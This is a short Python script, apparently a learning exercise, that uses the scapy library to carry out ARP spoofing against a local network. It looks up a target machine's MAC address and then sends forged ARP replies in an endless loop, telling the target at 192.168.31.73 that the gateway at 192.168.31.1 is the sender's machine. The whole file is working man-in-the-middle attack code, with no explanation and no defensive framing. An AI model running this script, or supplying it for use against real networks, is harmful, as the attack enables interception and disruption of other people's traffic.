  
#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    print(answered_list[0][1].hwsrc)
    return (answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    while True:
        packet = scapy.ARP(op = 2, pdst = target_ip,
                        hwdst = target_mac,
                        psrc = spoof_ip)
        scapy.send(packet, verbose=False)

target_ip = "192.168.31.73"
gateway_ip = "192.168.31.1"

spoof(target_ip, gateway_ip)

